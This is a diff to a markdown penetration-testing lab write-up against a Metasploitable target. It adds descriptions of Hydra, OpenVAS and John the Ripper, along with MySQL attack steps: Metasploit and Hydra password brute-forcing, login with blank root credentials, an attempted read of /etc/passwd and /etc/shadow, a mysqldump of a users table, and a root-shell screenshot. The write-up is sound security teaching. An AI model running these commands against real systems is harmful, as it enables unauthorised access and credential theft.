@@ -44,9 +44,41 @@ Metasploit is an open-source penetration testing platform that allows cybersecur
  #### Metasploit helps streamline the exploitation process, making it a go-to tool for vulnerability assessments and Exploitation.
 
  ---
- ### 3. Hydra
- ### 4. Openvas
- ### 5. John the ripper
+ ### 3. Hydra -> A password cracking tool
+ Hydra is a fast, versatile password-cracking tool used primarily for brute-force attacks on network services. Developed to support a wide range of protocols, Hydra can target services like SSH, FTP, HTTP, SMB, MySQL, RDP, and many others.
+
+**Key features of Hydra include:**
+
+    Protocol Support: Hydra supports over 50 protocols, making it useful across various network services and applications.
+
+    Parallelized Attacks: Hydra can run multiple login attempts in parallel, significantly increasing its speed and efficiency.
+
+    Customizable: Users can specify custom wordlists for usernames and passwords.
+
+    Modular Design: Hydra’s modular structure allows the addition of new protocols, extending its flexibility and usability.
+ ### 4. Openvas -> An open-source vulnerability scanning tool
+ OpenVAS (Open Vulnerability Assessment System) is an open-source framework(which is free to use) for comprehensive **vulnerability scanning** and management. It’s widely used for identifying security weaknesses across networks, systems, and applications. OpenVAS is a component of the Greenbone Vulnerability Manager (GVM), which provides additional management features.
+
+**Key features of OpenVAS include:**
+
+    Vulnerability Scanning: OpenVAS performs detailed vulnerability assessments on target systems, identifying misconfigurations, outdated software, and known vulnerabilities.
+
+    Large Vulnerability Database: It relies on a continuously updated feed of vulnerability definitions, allowing it to detect a wide range of issues across various software and platforms.
+
+    Customizable Scans: Users can adjust scan settings and schedules, define targets, and create specific scan policies.
+
+    Reporting and Management: OpenVAS generates detailed reports on detected vulnerabilities and provides options for prioritization and remediation guidance.
+ ### 5. John the ripper -> A password and hash-cracking tool.
+ John the Ripper is a powerful, open-source password-cracking tool commonly used for recovering lost passwords or testing password strength. Initially designed to crack Unix-based passwords, it now supports various operating systems and password hashes, including Windows NTLM, MD5, and SHA. Its flexibility and efficiency make it a staple in the cybersecurity and ethical hacking fields.
+**Key Features of John the Ripper**
+
+    Hash Support: John the Ripper can handle numerous password hash types, allowing it to target a wide array of systems and applications.
+
+    Hybrid Attack Modes: It combines dictionary attacks with brute-force and rule-based attacks, providing multiple strategies for effective password recovery.
+
+    Speed and Optimization: John’s algorithms are highly optimized, making it faster than many alternatives, especially on multicore systems.
+
+    Extensibility: John supports plugins and customizable rules, enabling it to adapt to different password-cracking requirements..
  ### 6. Hashid and Hash-identifier
 # Step 1 Enummeration or Reconnasissance
 
@@ -837,14 +869,18 @@ msf auxiliary(scanner/mysql/mysql_login) > set PASS_FILE /usr/share/seclist/Pass
 msf auxiliary(scanner/mysql/mysql_login) > set Blank_password true
 msf auxiliary(scanner/mysql/mysql_login) > run
 ```
-![](../images/
-Here we got that there is two user- 'root' and 'guest' which we can log in without password 
+![](../images/bruteforcing_mysql_login_using_metasploit_1.png)
+![](../images/bruteforcing_mysql_login_using_metasploit_2.png)
+This exploit failed to get executed because the mysql version(i.e 5.0.51) running on our target metasploitable machine is very old and having doesn't support the ssl authentication mechaninsm, while this mysql module needs to authenticate using ssl certification(by default) and got failed to connect to the sql server. So we can try other bruterforcing tool like Hydra. 
 
 **Using Hydra**
 ```
 hydra -L /usr/share/seclist/Usernames/usernames.txt -P /usr/share/seclist/Password/Leaked-Databases/rockyou.txt -e nsr -s 3306 192.168.1.103 mysql
 ```
-Here we got the same result...
+![](../images/bruteforcing_mysql_login_using_hydra_1.png)
+![](../images/bruteforcing_mysql_login_using_hydra_2.png)
+![](../images/bruteforcing_mysql_login_using_hydra_3.png)
+Here we got the results... As for now we found two users 'root' and 'guest' have access to the server without any password authentication. So get connected using the mysql-client and explore the various databases...
 
 **So overall from this phase we got a connection to the mysql server running on the target using username 'root' and 'guest' without password and we can see the different databases and tables stored on the server, which can proceed with in the next step..
 
@@ -858,8 +894,12 @@ mysqlshow -u root --host=192.168.1.103
 mysqlshow -u root --host=192.168.1.103 --count owasp10
 mysqlshow -u root --host=192.168.1.103 --count dvwa
 ```
+![](../images/performing_mysql_databases_enumeration_using_mysql_show.png)
 here we can see a list of db but I can find only these two databases which contain some important/sensitive information are dvwa and owasp10
 
+**Reading sensitive file**
+We can try to read sensitive file content like /etc/passwd and /etc/shadow using module like mysql_enum. But again for this module also it requires the ssl authentication and got failed to executed.
+![](../images/failed_mysql_readfile.png)
 **Start exploring the dvwa database**
 ```
 mysql -u root -h 192.168.1.103 --ssl=FALSE
@@ -900,6 +940,13 @@ select * from accounts;
 Here in the accounts table there are different user and their plain password for the owasp10 webapp. 
 
 **Till now we get two tables which have sensitive information about its users on the webapp of dvwa and owasp10.** We can also performing dumping crudential and other stuff on the different databases.
+
+**Dumping the crudential of databases(i.e make a copy of data as well as schema of the db into our local file)** 
+```
+mysql-dump -h 192.168.1.103 -u root --ssl=false dvwa users
+```
+![](../images/performing_mysql_dumping.png)
+But this attack is also failed for the same reason that mysql version(5.0.31) running on the target is old and doesn't contain field like information_schema.table(a database present in the newer mysql versions) which contain information about all table present in the databases and this field is used by the mysqldump module. we can try using an old mysqldump module version for this and this will definetly works for that.
 
 ---
 ## Exploiting Service on Port 5432 Postgresql -> postgresql db 8.3.0-8.3.7
@@ -1158,6 +1205,7 @@ msf expliot(linux/local/udev_netlink) > run
 ![](../images/privilage_esculation_form_tomcat55_user_1.png)
 ![](../images/privilage_esculation_form_tomcat55_user_2.png)
 ![](../images/privilage_esculation_form_tomcat55_user_3.png)
+![](../images/privilage_esculation_form_tomcat55_user_4.png)
 By using this module we had gained the root shell on the target. Now we can perform anything on the target as we have the root access like stealing data and sensitive file etc and other stuff... 
 
 We can also try login to tomcat via our browser, for that we need to get the login page ->
